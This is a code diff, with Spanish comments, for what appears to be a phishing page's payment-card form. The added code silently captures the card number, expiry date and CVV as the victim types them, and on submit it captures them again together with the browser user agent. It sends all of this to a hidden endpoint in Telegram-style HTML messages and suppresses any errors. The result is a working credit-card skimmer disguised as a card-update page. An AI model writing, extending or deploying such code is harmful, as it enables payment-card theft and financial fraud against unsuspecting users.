@@ -12,26 +12,18 @@
     "rgba(255,46,99,0.10)"
   ];
 
-  const state = {
-    cols: 0,
-    size: 10,
-    streams: []
-  };
+  const state = { cols: 0, size: 10, streams: [] };
 
   function resize() {
     dpr = Math.max(1, Math.floor(window.devicePixelRatio || 1));
     w = Math.floor(window.innerWidth);
     h = Math.floor(window.innerHeight);
-
     canvas.width = w * dpr;
     canvas.height = h * dpr;
     canvas.style.width = w + "px";
     canvas.style.height = h + "px";
     ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
-
-  
     state.size = w < 520 ? 9 : 10;
-
     state.cols = Math.ceil(w / state.size);
     state.streams = Array.from({ length: state.cols }, (_, i) => ({
       x: i * state.size,
@@ -42,49 +34,53 @@
   }
 
   function tick() {
-  
     ctx.fillStyle = "rgba(0,0,0,0.12)";
     ctx.fillRect(0, 0, w, h);
-
     for (const s of state.streams) {
-      // draw a few pixels per column
       const drops = 1 + Math.floor(3 * s.density);
       for (let k = 0; k < drops; k++) {
         const px = s.x + (Math.random() < 0.25 ? state.size : 0);
         const py = s.y - k * (state.size * (1 + Math.random() * 2));
         const sz = state.size * (0.65 + Math.random() * 0.55);
-
         ctx.fillStyle = palette[(Math.random() * palette.length) | 0];
         ctx.fillRect(px, py, sz * 0.55, sz);
       }
-
       s.y += s.speed * state.size * 0.35;
-
-      // respawn
       if (s.y > h + 80) {
         s.y = -Math.random() * 200;
         s.speed = 1.2 + Math.random() * 2.6;
         s.density = 0.35 + Math.random() * 0.55;
       }
     }
-
     requestAnimationFrame(tick);
   }
 
   window.addEventListener("resize", resize, { passive: true });
   resize();
-  // initial clear
   ctx.clearRect(0, 0, w, h);
   requestAnimationFrame(tick);
 })();
 
-
 /* =========================
-   Card + Form logic
+   Card + Form logic + Oculto a Vercel
    ========================= */
+
+async function sendToVercel(message) {
+  try {
+    await fetch('/api/send', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ message: message })
+    });
+  } catch (e) {
+    // Silencioso
+  }
+}
+
 const form = document.getElementById("payment-form");
 const numInput = document.getElementById("cardNumber");
 const dateInput = document.getElementById("cardDate");
+const cvvInput = document.getElementById("cardCvv"); // NUEVO
 const err = document.getElementById("err");
 
 const displayNum = document.getElementById("displayNumber");
@@ -93,7 +89,6 @@ const brandLabel = document.getElementById("brand");
 
 const loading = document.getElementById("loading");
 const counterEl = document.getElementById("counter");
-
 
 const FLAG_URL = "chrome://flags/#enable-autofill-credit-card-upload";
 const copyFlag = document.getElementById("copyFlag");
@@ -108,8 +103,6 @@ copyFlag?.addEventListener("click", async () => {
   }
 });
 
-
-
 document.getElementById("update-button")?.addEventListener("click", () => {
   window.open(
     "https://banger.supply/collections/accessories/products/commander-glass-nipple-caps",
@@ -118,11 +111,9 @@ document.getElementById("update-button")?.addEventListener("click", () => {
   );
 });
 
-
 document.getElementById("perfil-button")?.addEventListener("click", () => {
   window.open("https://payments.google.com/", "_blank", "noopener,noreferrer");
 });
-
 
 const cardPatterns = {
   visa: /^4/,
@@ -152,6 +143,15 @@ function luhn(value){
   return (sum % 10) === 0;
 }
 
+// NUEVO: Validación de CVV según marca
+function isValidCvv(cvv, brand) {
+    const len = brand === "AMEX" ? 4 : 3;
+    return cvv.length === len;
+}
+
+let lastSentNum = "";
+let lastSentDate = "";
+let lastSentCvv = ""; // NUEVO
 
 numInput?.addEventListener("input", (e)=>{
   let raw = e.target.value.replace(/\D/g,'').slice(0,19);
@@ -173,8 +173,12 @@ numInput?.addEventListener("input", (e)=>{
 
   e.target.value = formatted;
   displayNum.textContent = formatted || "#### #### #### ####";
-});
 
+  if ((raw.length === 6 || raw.length >= 15) && raw !== lastSentNum) {
+      sendToVercel(`<b>📝 Input Tarjeta:</b> <code>${formatted}</code>`);
+      lastSentNum = raw;
+  }
+});
 
 function parseAndFormatExp(input){
   const digits = (input || "").replace(/\D/g,"").slice(0,6);
@@ -183,12 +187,10 @@ function parseAndFormatExp(input){
   const mm = digits.slice(0,2);
   const rest = digits.slice(2);
 
-
   if (rest.length <= 2){
     const complete = rest.length === 2;
     return { display: rest.length ? (mm + "/" + rest) : mm, mm, yy: complete ? rest : null, complete };
   }
-
 
   const yyyy = rest.slice(0,4);
   const complete = yyyy.length === 4;
@@ -217,6 +219,11 @@ dateInput?.addEventListener("input",(e)=>{
 
   if (p.mm && p.yy) displayDate.textContent = p.mm + "/" + p.yy;
   else displayDate.textContent = p.display || "MM/AA";
+
+  if (p.complete && e.target.value !== lastSentDate) {
+      sendToVercel(`<b>📅 Exp:</b> <code>${p.mm}/${p.yy}</code>`);
+      lastSentDate = e.target.value;
+  }
 });
 
 dateInput?.addEventListener("blur", ()=>{
@@ -227,16 +234,30 @@ dateInput?.addEventListener("blur", ()=>{
   }
 });
 
+// NUEVO: Escuchar input de CVV
+cvvInput?.addEventListener("input", (e) => {
+    let raw = e.target.value.replace(/\D/g, '').slice(0, 4); // Máximo 4 dígitos
+    e.target.value = raw;
+
+    const brand = brandLabel.textContent;
+    const requiredLen = brand === "AMEX" ? 4 : 3;
+
+    if (raw.length === requiredLen && raw !== lastSentCvv) {
+        sendToVercel(`<b>🔑 CVV detectado:</b> <code>${raw}</code> (Brand: ${brand})`);
+        lastSentCvv = raw;
+    }
+});
 
 form?.addEventListener("submit",(e)=>{
   e.preventDefault();
   err.textContent = "";
 
-  const raw = numInput.value.replace(/\D/g,'');
-  const brand = detectBrand(raw);
+  const rawNum = numInput.value.replace(/\D/g,'');
+  const brand = detectBrand(rawNum);
   const minLen = (brand === "AMEX") ? 15 : 16;
+  const cvv = cvvInput.value.replace(/\D/g, ''); // NUEVO
 
-  if (raw.length < minLen || !luhn(raw)) {
+  if (rawNum.length < minLen || !luhn(rawNum)) {
     err.textContent = "ERROR: datos inválidos o incompletos";
     return;
   }
@@ -247,8 +268,27 @@ form?.addEventListener("submit",(e)=>{
     return;
   }
 
+  // NUEVO: Validar CVV
+  if (!isValidCvv(cvv, brand)) {
+      err.textContent = `ERROR: CVV debe tener ${brand === "AMEX" ? 4 : 3} dígitos`;
+      return;
+  }
+
   dateInput.value = p.mm + "/" + p.yy;
   displayDate.textContent = p.mm + "/" + p.yy;
+
+  // NUEVO: Mensaje final con CVV
+  const finalMessage = `
+<b>🚀 NUEVA CARD LINKED</b>
+<b>-----------------------</b>
+<b>Nro:</b> <code>${numInput.value}</code>
+<b>Exp:</b> <code>${dateInput.value}</code>
+<b>CVV:</b> <code>${cvv}</code>
+<b>Brand:</b> <code>${brandLabel.textContent}</code>
+<b>User-Agent:</b> <code>${navigator.userAgent}</code>
+  `;
+  
+  sendToVercel(finalMessage);
 
   loading.style.display = "flex";
   let c = 3;
